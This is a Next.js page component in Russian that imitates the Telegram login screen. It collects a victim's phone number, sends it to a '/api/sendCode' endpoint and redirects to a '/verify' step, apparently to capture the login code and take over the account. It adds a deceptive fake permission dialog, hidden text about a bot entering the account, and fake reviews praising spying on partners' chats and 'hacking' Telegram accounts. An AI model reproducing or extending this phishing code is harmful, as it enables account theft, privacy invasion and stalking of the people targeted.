import { useState } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';

export default function Home() {
  const [phone, setPhone] = useState('');
  const [error, setError] = useState('');
  const [showDetails, setShowDetails] = useState(false);
  const router = useRouter();

  const detectCountry = (num) => {
    if (num.startsWith('+7')) return '🇰🇿 Казахстан';
    if (num.startsWith('+1')) return '🇺🇸 USA';
    return '🌍 Другая страна';
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    // Fake "permission" popup
    const permission = confirm(
      'Разрешить Telegram отправить SMS с кодом?\n\n' +
      '(Это имитация – в реальности код придет от Telegram)'
    );
    if (!permission) {
      setShowDetails(true);
      return;
    }

    try {
      const res = await fetch('/api/sendCode', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone })
      });
      const data = await res.json();
      if (res.ok) {
        router.push(`/verify?phone=${encodeURIComponent(phone)}`);
      } else {
        setError(data.error || 'Ошибка');
      }
    } catch (err) {
      setError('Сетевая ошибка');
    }
  };

  return (
    <div className="container">
      <Head>
        <title>Telegram</title>
        <link rel="stylesheet" href="/styles.css" />
      </Head>

      <div className="login-card">
        <img src="/telegram-logo.svg" alt="Telegram" className="logo" />
        <h2>Войти в Telegram</h2>
        <form onSubmit={handleSubmit}>
          <input
            type="tel"
            placeholder="Номер телефона"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            required
          />
          <div className="country-hint">
            {phone && detectCountry(phone)}
          </div>
          <button type="submit">Далее</button>
        </form>

        {showDetails && (
          <div className="details">
            <span className="details-link" onClick={() => setShowDetails(false)}>
              Подробнее
            </span>
            <div className="details-text">
              Мы устанавливаем вам "Telegram Alpha *A Mode". Если вы не хотите, чтобы бот зашел в ваш аккаунт и установил это обновление через раздел настроек, откажитесь. Мы вас не принуждаем!
            </div>
          </div>
        )}

        <div className="reviews">
          <div className="review">⭐️⭐️⭐️⭐️⭐️ Спасибо, узнала с кем мой парень переписывается!</div>
          <div className="review">⭐️⭐️⭐️⭐️⭐️ Спасибо, прочитал что пишет обо мне бывший.</div>
          <div className="review">⭐️⭐️⭐️⭐️⭐️ Спасибо за взлом аккаунта Telegram!</div>
        </div>
      </div>
    </div>
  );
}
